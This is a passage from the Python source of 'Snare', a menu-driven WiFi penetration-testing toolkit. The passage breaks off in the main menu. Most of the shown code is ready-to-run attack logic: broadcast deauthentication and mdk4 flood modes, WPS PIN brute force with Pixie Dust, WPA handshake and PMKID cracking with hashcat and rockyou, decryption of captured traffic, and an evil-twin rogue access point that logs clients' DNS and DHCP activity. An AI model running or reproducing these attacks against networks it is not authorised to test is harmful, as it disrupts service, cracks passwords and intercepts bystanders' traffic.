#!/usr/bin/env python3
"""
Snare v2.1 - WiFi Penetration Testing Tool
For authorized security testing and educational use only.
"""

import argparse
import os
import sys
import time
import subprocess
import re
import signal
import shutil
import getpass
from pathlib import Path

# ─── CLI Arguments (parsed once at startup, shared globally) ──────────────────

_args = None  # set in main()

def _get_arg(name, default=None):
    """Return a CLI-supplied value or default."""
    return getattr(_args, name, default) if _args else default

# ─── Optional rich UI ─────────────────────────────────────────────────────────

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.prompt import Prompt, Confirm
    from rich.align import Align
    RICH = True
    console = Console()
except ImportError:
    RICH = False
    class _FallbackConsole:
        def print(self, *a, **kw):
            import re as _re
            text = " ".join(str(x) for x in a)
            print(_re.sub(r"\[/?[^\]]*\]", "", text))
        def rule(self, title=""):
            import re as _re
            title = _re.sub(r"\[/?[^\]]*\]", "", title)
            print(f"\n{'─'*20} {title} {'─'*20}")
    console = _FallbackConsole()

try:
    from scapy.all import sniff, wrpcap, Dot11
    SCAPY = True
except ImportError:
    SCAPY = False

# ─── Constants ─────────────────────────────────────────────────────────────────

VERSION = "2.1"

# Tools are split into required (core workflow) and optional (extra backends).
# Snare still works when optional tools are missing — they're just hidden from menus.
REQUIRED_TOOLS = ["airmon-ng", "aireplay-ng", "airdecap-ng", "tshark"]

# Each optional tool: (binary, description, install hint)
OPTIONAL_TOOLS = [
    ("airodump-ng",   "Classic AP/client scanner (aircrack-ng suite)", "sudo apt install aircrack-ng"),
    ("hcxdumptool",   "Modern PMKID/handshake capturer",               "sudo apt install hcxdumptool"),
    ("hcxtools",      "Convert hcxdumptool captures for hashcat",       "sudo apt install hcxtools"),
    ("wash",          "WPS network scanner",                            "sudo apt install reaver"),
    ("reaver",        "WPS brute-force",                                "sudo apt install reaver"),
    ("bettercap",     "Swiss-army network tool (ARP, BLE, WiFi)",       "sudo apt install bettercap"),
    ("kismet",        "Passive wireless network detector",              "sudo apt install kismet"),
    ("wifite",        "Automated WiFi audit wrapper",                   "sudo apt install wifite"),
    ("cowpatty",      "WPA/WPA2 offline cracker",                       "sudo apt install cowpatty"),
    ("hashcat",       "GPU-accelerated hash cracker",                   "sudo apt install hashcat"),
    ("john",          "CPU-based password cracker",                     "sudo apt install john"),
    ("hostapd",       "Rogue AP / evil-twin",                           "sudo apt install hostapd"),
    ("dnsmasq",       "DHCP/DNS for rogue AP setups",                   "sudo apt install dnsmasq"),
    ("mdk4",          "WiFi stress / deauth / beacon flood",            "sudo apt install mdk4"),
    ("pixiewps",      "WPS Pixie Dust attack",                          "sudo apt install pixiewps"),
]

BANNER = r"""
  ███████╗███╗   ██╗ █████╗ ██████╗ ███████╗
  ██╔════╝████╗  ██║██╔══██╗██╔══██╗██╔════╝
  ███████╗██╔██╗ ██║███████║██████╔╝█████╗
  ╚════██║██║╚██╗██║██╔══██║██╔══██╗██╔══╝
  ███████║██║ ╚████║██║  ██║██║  ██║███████╗
  ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
"""

_monitor_iface = None

# ─── Utility ──────────────────────────────────────────────────────────────────

def run(cmd, capture=True):
    """Run a command list, return (returncode, stdout, stderr)."""
    if isinstance(cmd, str):
        cmd = cmd.split()
    try:
        r = subprocess.run(cmd, capture_output=capture, text=True)
        return r.returncode, r.stdout, r.stderr
    except FileNotFoundError as e:
        return 1, "", str(e)

def run_interactive(cmd):
    """Run a command and let it own the terminal (for TUI tools like kismet)."""
    if isinstance(cmd, str):
        cmd = cmd.split()
    try:
        subprocess.run(cmd)
    except FileNotFoundError:
        console.print(f"[red][!] Command not found: {cmd[0]}[/]")
    except KeyboardInterrupt:
        pass

def ask(prompt, default=""):
    if RICH:
        return Prompt.ask(prompt, default=default) if default else Prompt.ask(prompt)
    result = input(f"  {prompt}{f' [{default}]' if default else ''}: ").strip()
    return result or default

def confirm(prompt):
    if RICH:
        return Confirm.ask(prompt)
    return input(f"  {prompt} [y/N]: ").strip().lower() in ("y", "yes")

def validate_mac(mac):
    return bool(re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", mac.strip()))

def tool_available(name):
    return shutil.which(name) is not None

def check_root():
    if os.geteuid() != 0:
        console.print("[bold red][!] Snare must be run as root.[/]")
        console.print("    Try:  [bold]sudo python3 Snare.py[/]")
        sys.exit(1)

def check_dependencies():
    missing_req = [t for t in REQUIRED_TOOLS if not tool_available(t)]
    ok = True
    if missing_req:
        console.print(f"[bold red][!] Missing required tools:[/] {', '.join(missing_req)}")
        console.print("    Install with:  sudo apt install aircrack-ng tshark")
        ok = False
    if not SCAPY:
        console.print("[bold red][!] Scapy not installed.[/]  pip install scapy")
        ok = False
    return ok

def show_tool_status():
    """Display which optional tools are installed vs missing."""
    if RICH:
        t = Table(title="Optional Tool Status", border_style="blue", show_header=True)
        t.add_column("Tool", style="white")
        t.add_column("Status", width=10)
        t.add_column("Description", style="dim")
        t.add_column("Install", style="dim")
        for name, desc, install in OPTIONAL_TOOLS:
            avail = tool_available(name)
            status = "[green]✓ installed[/]" if avail else "[red]✗ missing[/]"
            t.add_row(name, status, desc, "" if avail else install)
        console.print(t)
    else:
        print(f"\n{'Tool':<16} {'Status':<12} Description")
        print("─" * 70)
        for name, desc, _ in OPTIONAL_TOOLS:
            status = "installed" if tool_available(name) else "missing"
            print(f"{name:<16} {status:<12} {desc}")

def get_wireless_interfaces():
    _, out, _ = run("iw dev")
    return re.findall(r"Interface\s+(\S+)", out)

def print_banner():
    if RICH:
        console.print(f"[bold cyan]{BANNER}[/]")
        console.print(Align.center(f"[bold white]v{VERSION}[/]  [dim]Authorized use only[/]"))
        console.rule()
    else:
        print(BANNER)
        print(f"Snare v{VERSION}  |  Authorized use only")
        print("─" * 60)

# ─── Interface ────────────────────────────────────────────────────────────────

def select_interface():
    interfaces = get_wireless_interfaces()
    if not interfaces:
        console.print("[red][!] No wireless interfaces found. Is your adapter plugged in?[/]")
        return None

    if RICH:
        t = Table(title="Wireless Interfaces", show_header=True, border_style="blue")
        t.add_column("#", style="cyan", width=4)
        t.add_column("Interface", style="white")
        for i, iface in enumerate(interfaces, 1):
            t.add_row(str(i), iface)
        console.print(t)
    else:
        print("\nAvailable interfaces:")
        for i, iface in enumerate(interfaces, 1):
            print(f"  {i}. {iface}")

    choice = ask("Select interface", default="1")
    try:
        idx = int(choice) - 1
        if 0 <= idx < len(interfaces):
            return interfaces[idx]
    except ValueError:
        pass
    console.print("[red][!] Invalid selection.[/]")
    return None

def enable_monitor_mode(interface):
    global _monitor_iface
    console.print(f"\n[yellow][*] Enabling monitor mode on [bold]{interface}[/]...[/]")
    run("airmon-ng check kill".split())
    run(["airmon-ng", "start", interface])
    mon = f"{interface}mon"
    all_ifaces = get_wireless_interfaces()
    _monitor_iface = mon if mon in all_ifaces else interface
    console.print(f"[green][+] Monitor interface ready: [bold]{_monitor_iface}[/][/]")
    return _monitor_iface

def disable_monitor_mode():
    global _monitor_iface
    if not _monitor_iface:
        return
    console.print(f"\n[yellow][*] Restoring [bold]{_monitor_iface}[/] to managed mode...[/]")
    run(["airmon-ng", "stop", _monitor_iface])
    run("systemctl restart NetworkManager".split())
    console.print("[green][+] Interface restored.[/]")
    _monitor_iface = None

# ─── Network Scanning ─────────────────────────────────────────────────────────

def _scan_airodump(monitor_iface, duration):
    """Scan using airodump-ng, return (networks, clients)."""
    out_prefix = "/tmp/snare_scan"
    for f in Path("/tmp").glob("snare_scan*"):
        f.unlink(missing_ok=True)

    proc = subprocess.Popen(
        ["airodump-ng", "--write", out_prefix, "--output-format", "csv", monitor_iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        pass
    finally:
        proc.terminate()
        proc.wait()

    networks, clients = [], []
    csv_file = Path(f"{out_prefix}-01.csv")
    if not csv_file.exists():
        return networks, clients

    parsing_clients = False
    for line in csv_file.read_text(errors="replace").splitlines():
        if line.startswith("Station MAC"):
            parsing_clients = True
            continue
        parts = [p.strip() for p in line.split(",")]
        if parsing_clients:
            if len(parts) >= 6:
                clients.append({
                    "mac": parts[0],
                    "bssid": parts[5] if parts[5] != "(not associated)" else "—",
                    "probes": parts[6] if len(parts) > 6 else "",
                })
        else:
            if len(parts) >= 14 and validate_mac(parts[0]):
                networks.append({
                    "bssid": parts[0],
                    "channel": parts[3].strip(),
                    "privacy": parts[5].strip(),
                    "power": parts[8].strip(),
                    "essid": parts[13].strip(),
                })
    return networks, clients

def _scan_hcxdumptool(monitor_iface, duration, output_file="/tmp/snare_hcx.pcapng"):
    """Passive scan with hcxdumptool — captures PMKIDs and handshakes."""
    console.print(f"[yellow][*] hcxdumptool scanning for {duration}s...[/]")
    Path(output_file).unlink(missing_ok=True)
    proc = subprocess.Popen(
        ["hcxdumptool", "-i", monitor_iface, "-o", output_file,
         "--enable_status=1", "--disable_client_attacks"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        pass
    finally:
        proc.terminate()
        proc.wait()
    console.print(f"[green][+] Capture saved to [bold]{output_file}[/][/]")
    console.print("[dim]  Convert to hashcat format with:  hcxpcapngtool -o hashes.hc22000 " + output_file + "[/]")
    return output_file

def _scan_kismet(monitor_iface):
    """Launch Kismet interactively."""
    console.print("[yellow][*] Launching Kismet (press Ctrl+C to return to Snare)...[/]")
    run_interactive(["kismet", "-c", monitor_iface])

def choose_scan_backend():
    """Let user choose which scanning backend to use based on what's installed."""
    backends = []
    if tool_available("airodump-ng"):
        backends.append(("1", "airodump-ng",  "Classic scan — shows APs, clients, signal strength"))
    if tool_available("hcxdumptool"):
        backends.append((str(len(backends)+1), "hcxdumptool", "Modern PMKID / handshake harvester"))
    if tool_available("kismet"):
        backends.append((str(len(backends)+1), "kismet",      "Passive full-featured wireless IDS"))

    if not backends:
        console.print("[red][!] No scan backends available.[/]")
        console.print("    Install one:  sudo apt install aircrack-ng  OR  sudo apt install hcxdumptool")
        return None

    if len(backends) == 1:
        return backends[0][1]

    if RICH:
        t = Table(title="Scan Backends", show_header=True, border_style="blue")
        t.add_column("#", style="cyan", width=4)
        t.add_column("Tool", style="white")
        t.add_column("Description", style="dim")
        for key, name, desc in backends:
            t.add_row(key, name, desc)
        console.print(t)
    else:
        print("\nAvailable scan backends:")
        for key, name, desc in backends:
            print(f"  {key}. {name} — {desc}")

    choice = ask("Select backend", default="1")
    for key, name, _ in backends:
        if choice == key:
            return name
    return backends[0][1]

def scan_networks(monitor_iface):
    backend = choose_scan_backend()
    if not backend:
        return [], []

    dur = ask("Scan duration (seconds)", default="15")
    try:
        dur = int(dur)
    except ValueError:
        dur = 15

    if backend == "airodump-ng":
        return _scan_airodump(monitor_iface, dur)
    elif backend == "hcxdumptool":
        _scan_hcxdumptool(monitor_iface, dur)
        return [], []
    elif backend == "kismet":
        _scan_kismet(monitor_iface)
        return [], []
    return [], []

def display_networks(networks, clients):
    if not networks:
        console.print("[yellow][!] No networks parsed from scan.[/]")
        return

    if RICH:
        t = Table(title=f"Found {len(networks)} Networks", border_style="blue", show_header=True)
        t.add_column("#", style="cyan", width=4)
        t.add_column("BSSID", style="white")
        t.add_column("Ch", style="yellow", width=4)
        t.add_column("Encryption", style="magenta")
        t.add_column("Signal", style="green", width=8)
        t.add_column("SSID", style="bold white")
        for i, net in enumerate(networks, 1):
            t.add_row(str(i), net["bssid"], net["channel"], net["privacy"], net["power"],
                      net["essid"] or "[dim](hidden)[/]")
        console.print(t)

        if clients:
            c = Table(title=f"{len(clients)} Clients", border_style="dim", show_header=True)
            c.add_column("Client MAC", style="white")
            c.add_column("Associated AP", style="cyan")
            c.add_column("Probes", style="dim")
            for cl in clients[:30]:
                c.add_row(cl["mac"], cl["bssid"], cl["probes"][:40])
            console.print(c)
    else:
        print(f"\n{'#':<4} {'BSSID':<20} {'Ch':<4} {'Enc':<12} {'Sig':<8} SSID")
        print("─" * 70)
        for i, net in enumerate(networks, 1):
            print(f"{i:<4} {net['bssid']:<20} {net['channel']:<4} {net['privacy']:<12} {net['power']:<8} {net['essid'] or '(hidden)'}")
        if clients:
            print(f"\n{len(clients)} clients detected.")

# ─── Packet Capture ───────────────────────────────────────────────────────────

def choose_capture_backend():
    backends = []
    if SCAPY:
        backends.append(("1", "scapy",       "Live capture with per-frame stats (built-in)"))
    if tool_available("hcxdumptool"):
        backends.append((str(len(backends)+1), "hcxdumptool", "PMKID + handshake harvester (pcapng)"))
    if tool_available("tshark"):
        backends.append((str(len(backends)+1), "tshark",      "tshark live capture"))
    if tool_available("tcpdump"):
        backends.append((str(len(backends)+1), "tcpdump",     "tcpdump capture"))

    if not backends:
        console.print("[red][!] No capture backends available.[/]")
        return None

    if len(backends) == 1:
        return backends[0][1]

    if RICH:
        t = Table(title="Capture Backends", show_header=True, border_style="blue")
        t.add_column("#", style="cyan", width=4)
        t.add_column("Tool", style="white")
        t.add_column("Description", style="dim")
        for key, name, desc in backends:
            t.add_row(key, name, desc)
        console.print(t)
    else:
        for key, name, desc in backends:
            print(f"  {key}. {name} — {desc}")

    choice = ask("Select backend", default="1")
    for key, name, _ in backends:
        if choice == key:
            return name
    return backends[0][1]

def capture_scapy(monitor_iface, output_file, channel=None):
    if channel:
        run(["iwconfig", monitor_iface, "channel", str(channel)])
        console.print(f"[green][+] Tuned to channel {channel}[/]")
    console.print(f"[yellow][*] Capturing → [bold]{output_file}[/]  (Ctrl+C to stop)[/]\n")
    packets = []
    counts = {"total": 0, "data": 0, "beacon": 0, "probe": 0}

    def handler(pkt):
        if not pkt.haslayer(Dot11):
            return
        counts["total"] += 1
        if pkt.type == 2:
            counts["data"] += 1
        elif pkt.type == 0:
            if pkt.subtype == 8:
                counts["beacon"] += 1
            elif pkt.subtype in (4, 5):
                counts["probe"] += 1
        packets.append(pkt)
        print(
            f"\r  Data:{counts['data']:>5}  Beacon:{counts['beacon']:>5}"
            f"  Probe:{counts['probe']:>5}  Total:{counts['total']:>6}  ",
            end="", flush=True,
        )

    try:
        sniff(iface=monitor_iface, prn=handler, store=False)
    except KeyboardInterrupt:
        print()

    if packets:
        wrpcap(output_file, packets)
        console.print(f"[green][+] {len(packets)} packets saved to [bold]{output_file}[/][/]")
    else:
        console.print("[yellow][!] No packets captured.[/]")

def capture_hcxdumptool(monitor_iface, output_file, channel=None):
    cmd = ["hcxdumptool", "-i", monitor_iface, "-o", output_file, "--enable_status=1"]
    if channel:
        cmd += ["-c", str(channel)]
    console.print(f"[yellow][*] hcxdumptool capturing → [bold]{output_file}[/]  (Ctrl+C to stop)[/]")
    run_interactive(cmd)
    if Path(output_file).exists():
        console.print(f"[green][+] Saved to [bold]{output_file}[/][/]")
        if tool_available("hcxpcapngtool"):
            if confirm("Convert to hashcat format now?"):
                hc_file = output_file.replace(".pcapng", ".hc22000")
                run(["hcxpcapngtool", "-o", hc_file, output_file])
                console.print(f"[green][+] Hashcat file: [bold]{hc_file}[/][/]")
        else:
            console.print("[dim]  Tip: install hcxtools to convert to hashcat format.[/]")

def capture_tshark(monitor_iface, output_file, channel=None):
    if channel:
        run(["iwconfig", monitor_iface, "channel", str(channel)])
    cmd = ["tshark", "-i", monitor_iface, "-w", output_file]
    console.print(f"[yellow][*] tshark capturing → [bold]{output_file}[/]  (Ctrl+C to stop)[/]")
    run_interactive(cmd)

def capture_tcpdump(monitor_iface, output_file, channel=None):
    if channel:
        run(["iwconfig", monitor_iface, "channel", str(channel)])
    cmd = ["tcpdump", "-i", monitor_iface, "-w", output_file]
    console.print(f"[yellow][*] tcpdump capturing → [bold]{output_file}[/]  (Ctrl+C to stop)[/]")
    run_interactive(cmd)

def capture_packets(monitor_iface, default_output=None, default_channel=None):
    backend = choose_capture_backend()
    if not backend:
        return

    default_ext = ".pcapng" if backend == "hcxdumptool" else ".pcap"
    out = default_output or ask("Output filename", default=f"captured{default_ext}")
    ch = default_channel or ask("Lock to channel (blank = all channels)")

    if backend == "scapy":
        capture_scapy(monitor_iface, out, channel=ch if ch else None)
    elif backend == "hcxdumptool":
        capture_hcxdumptool(monitor_iface, out, channel=ch if ch else None)
    elif backend == "tshark":
        capture_tshark(monitor_iface, out, channel=ch if ch else None)
    elif backend == "tcpdump":
        capture_tcpdump(monitor_iface, out, channel=ch if ch else None)

# ─── Decryption ───────────────────────────────────────────────────────────────

def decrypt_traffic(input_file="captured.pcap", output_file="decrypted.pcap"):
    if not Path(input_file).exists():
        console.print(f"[red][!] File not found: {input_file}[/]")
        return

    # Use --password CLI arg if supplied, otherwise prompt (hidden)
    wifi_password = _get_arg("password") or getpass.getpass("  WiFi password (hidden): ")
    if not wifi_password:
        console.print("[red][!] Password cannot be empty.[/]")
        return

    ssid = _get_arg("ssid") or ask("Network SSID (blank to skip)")
    console.print("[yellow][*] Decrypting...[/]")

    cmd = ["airdecap-ng", "-p", wifi_password, input_file, "-o", output_file]
    if ssid:
        cmd += ["-e", ssid]

    code, out, err = run(cmd)
    if code == 0:
        console.print(f"[green][+] Decrypted file saved to [bold]{output_file}[/][/]")
        for line in out.splitlines():
            if line.strip():
                console.print(f"  [dim]{line}[/]")
    else:
        console.print("[red][!] Decryption failed. Wrong password or unsupported encryption?[/]")
        if err.strip():
            console.print(f"  [dim]{err.strip()}[/]")

# ─── Data Extraction ──────────────────────────────────────────────────────────

def extract_data(pcap_file="decrypted.pcap", output_file="network_data.txt"):
    if not Path(pcap_file).exists():
        console.print(f"[red][!] File not found: {pcap_file}[/]")
        return

    console.print("[yellow][*] Extracting network data with tshark...[/]")
    fields = [
        "-e", "eth.src", "-e", "eth.dst",
        "-e", "ip.src", "-e", "ip.dst",
        "-e", "tcp.srcport", "-e", "tcp.dstport",
        "-e", "udp.srcport", "-e", "udp.dstport",
    ]
    code, out, err = run(["tshark", "-r", pcap_file, "-T", "fields"] + fields)
    if code != 0:
        console.print(f"[red][!] tshark error:[/] {err.strip()}")
        return

    lines = sorted(set(l for l in out.splitlines() if l.strip()))
    header = "src_mac\t\tdst_mac\t\tsrc_ip\t\tdst_ip\t\ttcp_src\ttcp_dst\tudp_src\tudp_dst"
    with open(output_file, "w") as f:
        f.write(header + "\n" + "─" * 100 + "\n")
        f.write("\n".join(lines))

    console.print(f"[green][+] {len(lines)} unique entries saved to [bold]{output_file}[/][/]")

    if RICH and lines:
        t = Table(title="Network Data Preview (first 20)", border_style="blue", show_header=True)
        for h in ["Src MAC", "Dst MAC", "Src IP", "Dst IP", "TCP Src", "TCP Dst", "UDP Src", "UDP Dst"]:
            t.add_column(h, style="white")
        for line in lines[:20]:
            parts = (line.split("\t") + [""] * 8)[:8]
            t.add_row(*parts)
        console.print(t)

# ─── Deauth / Disruption ──────────────────────────────────────────────────────

def choose_deauth_backend():
    backends = []
    if tool_available("aireplay-ng"):
        backends.append(("1", "aireplay-ng", "Standard deauth frames (single target or broadcast)"))
    if tool_available("mdk4"):
        backends.append((str(len(backends)+1), "mdk4",        "Multi-mode: deauth, beacon flood, Michael shutdown"))
    if tool_available("bettercap"):
        backends.append((str(len(backends)+1), "bettercap",   "bettercap wifi.deauth (interactive)"))
    if not backends:
        console.print("[red][!] No deauth tools found.[/]")
        console.print("    Install:  sudo apt install aircrack-ng  OR  sudo apt install mdk4")
        return None
    if len(backends) == 1:
        return backends[0][1]
    if RICH:
        t = Table(title="Deauth Backends", show_header=True, border_style="blue")
        t.add_column("#", style="cyan", width=4)
        t.add_column("Tool", style="white")
        t.add_column("Description", style="dim")
        for key, name, desc in backends:
            t.add_row(key, name, desc)
        console.print(t)
    else:
        for key, name, desc in backends:
            print(f"  {key}. {name} — {desc}")
    choice = ask("Select backend", default="1")
    for key, name, _ in backends:
        if choice == key:
            return name
    return backends[0][1]

def deauth_attack(monitor_iface, networks=None):
    console.print("\n[bold red][ Deauthentication / Disruption Attack ][/]")
    console.print("[dim]Disconnects clients from an AP by sending deauth/disassoc frames.[/]\n")

    backend = choose_deauth_backend()
    if not backend:
        return

    if backend == "mdk4":
        _deauth_mdk4(monitor_iface)
        return
    if backend == "bettercap":
        _deauth_bettercap(monitor_iface)
        return

    # aireplay-ng path
    gateway_mac = ""
    if networks:
        if confirm("Pick AP from last scan?"):
            display_networks(networks, [])
            choice = ask("Select network #", default="1")
            try:
                net = networks[int(choice) - 1]
                gateway_mac = net["bssid"]
                console.print(f"[green][+] Using AP: {net['essid']} ({gateway_mac})[/]")
            except (ValueError, IndexError):
                console.print("[yellow][!] Invalid selection, enter MAC manually.[/]")

    if not gateway_mac:
        gateway_mac = ask("Gateway / AP MAC address")
    if not validate_mac(gateway_mac):
        console.print("[red][!] Invalid MAC. Format: AA:BB:CC:DD:EE:FF[/]")
        return

    target_mac = ask("Target client MAC (FF:FF:FF:FF:FF:FF = all clients)", default="FF:FF:FF:FF:FF:FF")
    if not validate_mac(target_mac):
        console.print("[red][!] Invalid MAC.[/]")
        return

    count = ask("Number of deauth frames", default="50")
    try:
        count = int(count)
    except ValueError:
        count = 50

    console.print(f"\n[yellow][*] Sending {count} deauth frames via aireplay-ng[/]")
    console.print(f"    AP     → [bold]{gateway_mac}[/]")
    console.print(f"    Target → [bold]{target_mac}[/]")

    code, out, err = run(["aireplay-ng", "--deauth", str(count),
                          "-a", gateway_mac, "-c", target_mac, monitor_iface])
    if code == 0:
        console.print("[green][+] Deauth attack complete.[/]")
    else:
        console.print("[red][!] Attack failed.[/]")
        if err.strip():
            console.print(f"  [dim]{err.strip()}[/]")

def _deauth_mdk4(monitor_iface):
    console.print("[dim]mdk4 modes: d=deauth, b=beacon flood, m=Michael shutdown, a=auth flood[/]")
    mode = ask("mdk4 mode", default="d")
    extra = ask("Extra mdk4 arguments (blank for defaults)")
    cmd = ["mdk4", monitor_iface, mode]
    if extra:
        cmd += extra.split()
    console.print(f"[yellow][*] Running mdk4 (Ctrl+C to stop)...[/]")
    run_interactive(cmd)

def _deauth_bettercap(monitor_iface):
    console.print("[yellow][*] Launching bettercap (Ctrl+C to return to Snare)...[/]")
    console.print("[dim]  Useful commands inside bettercap:[/]")
    console.print("[dim]    wifi.recon on[/]")
    console.print("[dim]    wifi.show[/]")
    console.print("[dim]    wifi.deauth <BSSID>[/]")
    run_interactive(["bettercap", "-iface", monitor_iface])

# ─── Handshake Cracking ───────────────────────────────────────────────────────

def crack_handshake():
    console.print("\n[bold yellow][ Handshake / Hash Cracking ][/]")
    console.print("[dim]Offline password recovery from a captured handshake.[/]\n")

    backends = []
    if tool_available("hashcat"):
        backends.append(("1", "hashcat",  "GPU-accelerated (fastest, needs hash format)"))
    if tool_available("john"):
        backends.append((str(len(backends)+1), "john",     "CPU-based (john the ripper)"))
    if tool_available("cowpatty"):
        backends.append((str(len(backends)+1), "cowpatty", "WPA-PSK offline cracker"))
    if tool_available("aircrack-ng"):
        backends.append((str(len(backends)+1), "aircrack-ng", "WPA handshake cracker"))

    if not backends:
        console.print("[red][!] No cracking tools found.[/]")
        console.print("    Install:  sudo apt install hashcat john aircrack-ng")
        return

    if RICH:
        t = Table(title="Cracking Backends", show_header=True, border_style="blue")
        t.add_column("#", style="cyan", width=4)
        t.add_column("Tool", style="white")
        t.add_column("Notes", style="dim")
        for key, name, desc in backends:
            t.add_row(key, name, desc)
        console.print(t)
    else:
        for key, name, desc in backends:
            print(f"  {key}. {name} — {desc}")

    choice = ask("Select tool", default="1")
    selected = backends[0][1]
    for key, name, _ in backends:
        if choice == key:
            selected = name
            break

    default_wl = _get_arg("wordlist") or "/usr/share/wordlists/rockyou.txt"
    wordlist = ask("Path to wordlist", default=default_wl)
    if not Path(wordlist).exists():
        console.print(f"[yellow][!] Wordlist not found: {wordlist}[/]")

    if selected == "hashcat":
        hash_file = ask("Hash file (hc22000 from hcxpcapngtool)")
        run_interactive(["hashcat", "-m", "22000", hash_file, wordlist, "--force"])

    elif selected == "john":
        pcap = ask("Capture file (pcap/pcapng)")
        run_interactive(["john", f"--wordlist={wordlist}", pcap])

    elif selected == "cowpatty":
        pcap = ask("Capture file (.pcap)")
        ssid = ask("Target SSID")
        run_interactive(["cowpatty", "-r", pcap, "-f", wordlist, "-s", ssid])

    elif selected == "aircrack-ng":
        pcap = ask("Capture file (.pcap containing handshake)")
        run_interactive(["aircrack-ng", "-w", wordlist, pcap])

# ─── WPS Attacks ─────────────────────────────────────────────────────────────

def wps_attack(monitor_iface):
    console.print("\n[bold yellow][ WPS Attacks ][/]")

    if tool_available("wash"):
        if confirm("Scan for WPS-enabled networks first?"):
            console.print("[yellow][*] Running wash (Ctrl+C to stop)...[/]")
            run_interactive(["wash", "-i", monitor_iface])

    backends = []
    if tool_available("reaver"):
        backends.append(("1", "reaver",   "WPS PIN brute-force"))
    if tool_available("pixiewps"):
        backends.append((str(len(backends)+1), "pixiewps", "WPS Pixie Dust offline attack"))

    if not backends:
        console.print("[red][!] No WPS attack tools found.[/]")
        console.print("    Install:  sudo apt install reaver pixiewps")
        return

    if RICH:
        t = Table(title="WPS Attack Tools", show_header=True, border_style="blue")
        t.add_column("#", style="cyan", width=4)
        t.add_column("Tool", style="white")
        t.add_column("Type", style="dim")
        for key, name, desc in backends:
            t.add_row(key, name, desc)
        console.print(t)
    else:
        for key, name, desc in backends:
            print(f"  {key}. {name} — {desc}")

    choice = ask("Select tool", default="1")
    bssid = ask("Target AP BSSID")
    if not validate_mac(bssid):
        console.print("[red][!] Invalid BSSID.[/]")
        return

    if choice == "1" and tool_available("reaver"):
        cmd = ["reaver", "-i", monitor_iface, "-b", bssid, "-vv"]
        if tool_available("pixiewps"):
            if confirm("Use Pixie Dust mode (-K)?"):
                cmd += ["-K"]
        run_interactive(cmd)
    elif tool_available("pixiewps"):
        console.print("[dim]pixiewps requires PKE, PKR, E-Hash1, E-Hash2, E-Nonce, AuthKey values from reaver -vv output.[/]")
        console.print("[dim]Run reaver with -vv and paste the values here, or use reaver -K for automated Pixie Dust.[/]")

# ─── Rogue AP ────────────────────────────────────────────────────────────────

def rogue_ap(managed_iface):
    console.print("\n[bold yellow][ Rogue AP / Evil Twin ][/]")
    console.print("[dim]Requires hostapd + dnsmasq.[/]\n")

    if not tool_available("hostapd"):
        console.print("[red][!] hostapd not found.[/]  sudo apt install hostapd")
        return
    if not tool_available("dnsmasq"):
        console.print("[red][!] dnsmasq not found.[/]  sudo apt install dnsmasq")
        return

    ssid = ask("SSID for fake AP")
    channel = ask("Channel", default="6")
    iface = ask("Interface for AP (usually a second adapter)", default=managed_iface)

    hostapd_conf = f"/tmp/snare_hostapd.conf"
    dnsmasq_conf = f"/tmp/snare_dnsmasq.conf"

    Path(hostapd_conf).write_text(
        f"interface={iface}\n"
        f"ssid={ssid}\n"
        f"channel={channel}\n"
        "hw_mode=g\n"
        "ignore_broadcast_ssid=0\n"
    )
    Path(dnsmasq_conf).write_text(
        f"interface={iface}\n"
        "dhcp-range=192.168.10.10,192.168.10.50,12h\n"
        "dhcp-option=3,192.168.10.1\n"
        "dhcp-option=6,192.168.10.1\n"
        "server=8.8.8.8\n"
        "log-queries\n"
        "log-dhcp\n"
    )

    console.print(f"[green][+] Configs written to {hostapd_conf} and {dnsmasq_conf}[/]")
    console.print(f"[dim]  Edit them if needed before launching.[/]")

    if confirm("Launch rogue AP now?"):
        console.print("[yellow][*] Configuring interface...[/]")
        run(["ip", "addr", "add", "192.168.10.1/24", "dev", iface])
        run(["ip", "link", "set", iface, "up"])
        console.print("[yellow][*] Starting hostapd (Ctrl+C to stop)...[/]")
        try:
            proc = subprocess.Popen(["hostapd", hostapd_conf])
            time.sleep(1)
            dns_proc = subprocess.Popen(["dnsmasq", f"--conf-file={dnsmasq_conf}", "--no-daemon"],
                                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            console.print("[green][+] Rogue AP is live. Press Ctrl+C to stop.[/]")
            proc.wait()
        except KeyboardInterrupt:
            proc.terminate()
            dns_proc.terminate()
            console.print("[yellow][*] Rogue AP stopped.[/]")

# ─── Automated Tools ─────────────────────────────────────────────────────────

def launch_wifite(monitor_iface):
    if not tool_available("wifite"):
        console.print("[red][!] wifite not found.[/]  sudo apt install wifite")
        return
    console.print("[yellow][*] Launching wifite (Ctrl+C to return to Snare)...[/]")
    run_interactive(["wifite", "--interface", monitor_iface])

# ─── Main Menu ────────────────────────────────────────────────────────────────

def main_menu(monitor_iface, original_iface):
    last_networks = []

    while True:
        console.rule(f"[bold cyan]Snare v{VERSION}  |  {monitor_iface}[/]")

        options = [
            ("1", "Scan for nearby networks"),
            ("2", "Capture packets"),
            ("3", "Decrypt captured traffic          (airdecap-ng)"),
            ("4", "Extract network data              (tshark)"),
            ("5", "Deauthentication / disruption"),
            ("6", "Crack handshake / hash"),
            ("7", "WPS attacks                       (reaver / pixiewps)"),
            ("8", "Rogue AP / Evil Twin              (hostapd + dnsmasq)"),
            ("9", "Automated WiFi audit              (wifite)"),
            ("t", "Show tool availability"),
            ("0", "Disable monitor mode & exit"),
        ]

        if RICH:
            t = Table(show_header=False, box=None, padding=(0, 2))
            t.add_column("Key", style="cyan", width=4)
            t.add_column("Action", style="white")
            for key, label in options:
                style = "bold red" if key == "0" else "white"
                t.add_row(f"[cyan]{key}[/]", f"[{style}]{label}[/]")
            console.print(t)
        else:
            for key, label in options:
                print(f"  {key}  {label}")

        console.print()
        valid = [o[0] for o in options]

        if RICH:
            choice = Prompt.ask("Option", choices=valid)
        else:
            choice = input("  Option: ").strip()
            if choice not in valid:
                console.print("[red]Invalid option.[/]")
                continue

        console.print()

        if choice == "1":
            nets, clients = scan_networks(monitor_iface)
            display_networks(nets, clients)
            if nets:
                last_networks = nets

        elif choice == "2":
            capture_packets(monitor_iface,
                            default_output=_get_arg("output"),
